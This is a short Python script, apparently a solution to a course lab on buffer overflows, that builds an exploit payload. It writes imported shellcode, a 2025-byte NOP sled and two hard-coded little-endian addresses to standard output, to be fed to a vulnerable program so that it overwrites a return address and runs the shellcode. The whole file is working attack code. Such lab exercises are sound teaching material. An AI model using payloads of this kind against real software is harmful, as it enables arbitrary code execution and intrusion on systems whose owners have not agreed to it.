#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(shellcode + b'\x90'*2025 + pack('<I', 0xfffef5c8) + pack('<I', 0xfffefddc))
